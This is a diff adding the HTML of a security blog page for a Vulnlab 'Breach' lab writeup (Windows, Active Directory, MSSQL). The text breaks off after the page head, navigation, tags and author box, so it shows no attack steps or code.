@@ -1,0 +1,1898 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>Vulnlab-Breach &middot; Bailey&#39;s Blog</title>
+    <meta name="title" content="Vulnlab-Breach &middot; Bailey&#39;s Blog">
+
+  
+  <meta name="description" content="Detailed writeup of breach from Vulnlab">
+  <meta name="keywords" content="mssql,Windows,Active Directory,AV,Potato,">
+  
+  
+  <link rel="canonical" href="https://localhost:1313/writeups/vulnlab-breach/">
+  <link rel="stylesheet" href="/css/chroma.css">
+  <link rel="stylesheet" href="/css/term.css">
+  <link rel="stylesheet" href="/css/copy-btn.css">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.41ccf158e8b20af093f904e765d07015a786fdc35677cfc16ffff96a6b5235a45e9ce5dc22b59be2c7ec2ae5e4f302e565ca1e75c2439c5c81d44f4c70102851.css"
+    integrity="sha512-QczxWOiyCvCT&#43;QTnZdBwFaeG/cNWd8/Bb//5amtSNaRenOXcIrWb4sfsKuXk8wLlZcoedcJDnFyB1E9McBAoUQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+      integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.d9ad02b8cdad6c2d39586a85807e1a240c1c6ea031ba5cd39afd9791567621d0a6fdc4ee316164f6472f8e3b03b5ab6644bdd33050bbaa92cef80537de5345b3.js"
+      integrity="sha512-2a0CuM2tbC05WGqFgH4aJAwcbqAxulzTmv2XkVZ2IdCm/cTuMWFk9kcvjjsDtatmRL3TMFC7qpLO&#43;AU33lNFsw=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="https://localhost:1313/writeups/vulnlab-breach/">
+  <meta property="og:site_name" content="Bailey&#39;s Blog">
+  <meta property="og:title" content="Vulnlab-Breach">
+  <meta property="og:description" content="Detailed writeup of breach from Vulnlab">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-09-19T14:53:56+00:00">
+    <meta property="article:modified_time" content="2025-09-19T14:53:56+00:00">
+    <meta property="article:tag" content="Mssql">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="AV">
+    <meta property="article:tag" content="Potato">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Vulnlab-Breach">
+  <meta name="twitter:description" content="Detailed writeup of breach from Vulnlab">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "Vulnlab-Breach",
+    "headline": "Vulnlab-Breach",
+    "description": "Detailed writeup of breach from Vulnlab",
+    "abstract": "\u003ch2 class=\u0022relative group\u0022\u003eOverview \n    \u003cdiv id=\u0022overview\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#overview\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c\/strong\u003e: Vulnlab\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c\/strong\u003e: Medium\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c\/strong\u003e: Windows\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c\/strong\u003e: Active Directory, privilege escalation, mssql\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eAssumed Breach Credentials: No assumed breach\u003c\/strong\u003e\u003c\/em\u003e\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "https:\/\/localhost:1313\/writeups\/vulnlab-breach\/",
+    "author" : {
+      "@type": "Person",
+      "name": "BeejaySec"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-09-19T14:53:56\u002b00:00",
+    "datePublished": "2025-09-19T14:53:56\u002b00:00",
+    
+    "dateModified": "2025-09-19T14:53:56\u002b00:00",
+    
+    "keywords": ["mssql","Windows","Active Directory","AV","Potato"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2375"
+  }]
+  </script>
+
+
+
+  
+  
+    <meta name="author" content="BeejaySec">
+  
+  
+    
+      
+        
+          <link href="https://www.linkedin.com/in/bailey-bradshaw-194597198/" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://github.com/0xBeejay" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/bailey-bradshaw-194597198/" rel="me">
+        
+      
+    
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+  
+
+  <script
+  async
+  src="https://www.googletagmanager.com/gtag/js?id=G-PEDMYR1V0K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PEDMYR1V0K');
+</script>
+
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium">
+          Bailey&rsquo;s Blog
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/about/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="whoami">
+    About
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/projects/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Projects">
+    Projects
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/writeups/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Writeups">
+    Writeups
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/contact/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Contact">
+    Contact
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/about/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="whoami">
+      About
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/projects/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Projects">
+      Projects
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/writeups/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Writeups">
+      Writeups
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/contact/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Contact">
+      Contact
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var $mainmenu = $(".main-menu");
+      var path = window.location.pathname;
+      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+        $(e).children("p").addClass("active");
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+  integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+  
+    
+      
+    
+  
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    <img
+      id="background-image"
+      src="/img/background.svg"
+      alt="Background Image"
+      class="absolute inset-0 w-full h-full object-cover">
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/img/background.svg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >Bailey&#39;s Portfolio</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/"
+      >Writeups</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/vulnlab-breach/"
+      >Vulnlab-Breach</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Vulnlab-Breach
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <span>2375 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Enable zen mode"
+    data-title-i18n-disable="Enable zen mode"
+    data-title-i18n-enable="Disable zen mode">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/writeups/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeups
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/mssql/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Mssql
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/windows/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/active-directory/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Active Directory
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/av/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    AV
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/potato/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Potato
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="BeejaySec"
+        src="/img/chrollo_hu_b8a595a15dc0bcb.jpg">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        BeejaySec
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">A cybersecurity enthusiast focusing on infra and web application security, constantly honing my skills through the participation of CTF&rsquo;s and security challenges.</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/bailey-bradshaw-194597198/"
+          target="_blank"
+          aria-label="Linkedin"
+          title="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/0xBeejay"
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
